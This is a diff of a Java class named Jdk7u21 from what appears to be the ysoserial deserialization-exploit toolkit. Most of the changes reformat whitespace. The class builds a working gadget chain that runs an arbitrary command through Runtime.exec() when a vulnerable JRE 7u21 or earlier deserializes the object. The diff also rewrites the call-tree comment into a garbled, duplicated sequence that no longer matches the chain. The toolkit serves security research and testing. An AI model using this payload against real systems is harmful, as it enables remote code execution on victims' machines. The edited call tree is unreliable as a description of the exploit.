@@ -23,13 +23,18 @@ the same JRE version requirements.
 See: https://gist.github.com/frohoff/24af7913611f8406eaf3
 
 Call tree:
-
+LinkedHashSet.add()
 LinkedHashSet.readObject()
-  LinkedHashSet.add()
+HashMap.read()
+HashMap.put()
+key.hashCode()
     ...
       TemplatesImpl.hashCode() (X)
   LinkedHashSet.add()
-    ...
+    LinkedHashSet.readObject()
+    HashMap.read()
+    HashMap.put()
+    key.hashCode()
       Proxy(Templates).hashCode() (X)
         AnnotationInvocationHandler.invoke() (X)
           AnnotationInvocationHandler.hashCodeImpl() (X)
@@ -53,43 +58,45 @@ LinkedHashSet.readObject()
                                 Runtime.exec()
  */
 
-@SuppressWarnings({ "rawtypes", "unchecked" })
-@PayloadTest ( precondition = "isApplicableJavaVersion")
+@SuppressWarnings({"rawtypes", "unchecked"})
+@PayloadTest(precondition = "isApplicableJavaVersion")
 @Dependencies()
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class Jdk7u21 implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+    public Object getObject(final String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
 
-		String zeroHashCodeStr = "f5a5a608";
+        String zeroHashCodeStr = "f5a5a608";
 
-		HashMap map = new HashMap();
-		map.put(zeroHashCodeStr, "foo");
+        HashMap map = new HashMap();
+        map.put(zeroHashCodeStr, "foo");
 
-		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
-		Reflections.setFieldValue(tempHandler, "type", Templates.class);
-		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
+        InvocationHandler tempHandler =
+            (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class,
+                map);
+        Reflections.setFieldValue(tempHandler, "type", Templates.class);
+        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
 
-		LinkedHashSet set = new LinkedHashSet(); // maintain order
-		set.add(templates);
-		set.add(proxy);
+        LinkedHashSet set = new LinkedHashSet(); // maintain order
+        set.add(templates);
+        set.add(proxy);
 
-		Reflections.setFieldValue(templates, "_auxClasses", null);
-		Reflections.setFieldValue(templates, "_class", null);
+        Reflections.setFieldValue(templates, "_auxClasses", null);
+        Reflections.setFieldValue(templates, "_class", null);
 
-		map.put(zeroHashCodeStr, templates); // swap in real object
+        map.put(zeroHashCodeStr, templates); // swap in real object
 
-		return set;
-	}
+        return set;
+    }
 
-	public static boolean isApplicableJavaVersion() {
-	    JavaVersion v = JavaVersion.getLocalVersion();
-	    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
-	}
+    public static boolean isApplicableJavaVersion() {
+        JavaVersion v = JavaVersion.getLocalVersion();
+        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
+    }
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(Jdk7u21.class, args);
-	}
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Jdk7u21.class, args);
+    }
 
 }
